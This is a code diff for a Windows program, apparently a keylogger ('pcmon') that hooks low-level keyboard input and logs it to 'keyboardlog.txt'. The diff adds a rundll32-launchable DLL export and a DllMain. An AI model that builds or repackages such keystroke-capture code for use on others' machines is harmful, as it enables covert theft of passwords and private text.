@@ -3,6 +3,35 @@
 
 #pragma comment(lib, "User32.lib")
 
+int pcmon_main();
+
+// Use extern "C" to prevent C++ name mangling
+extern "C" {
+    // __declspec(dllexport) tells the compiler to expose this function outside the DLL
+    __declspec(dllexport) void CALLBACK LaunchApp(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+        // Place your original main() logic here
+        MessageBoxA(hwnd, "DLL successfully launched via rundll32!", "Success", MB_OK);
+        
+        // If you passed arguments in the command line, they are available in lpszCmdLine
+        if (lpszCmdLine && strlen(lpszCmdLine) > 0) {
+            MessageBoxA(hwnd, lpszCmdLine, "Arguments Passed", MB_OK);
+        }
+
+        pcmon_main();
+    }
+}
+
+// Optional: Standard DllMain entry point for initialization
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+    switch (fdwReason) {
+        case DLL_PROCESS_ATTACH:
+            break;
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}
+
 
 FILE *fptr;
 // Handle to the hook
@@ -56,7 +85,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 	return CallNextHookEx(hhkLowLevelKybd, nCode, wParam, lParam);
 }
 
-int main() {
+int pcmon_main() {
 	fptr = fopen("keyboardlog.txt", "a");
 	setvbuf(fptr, NULL, _IONBF, 0);
 
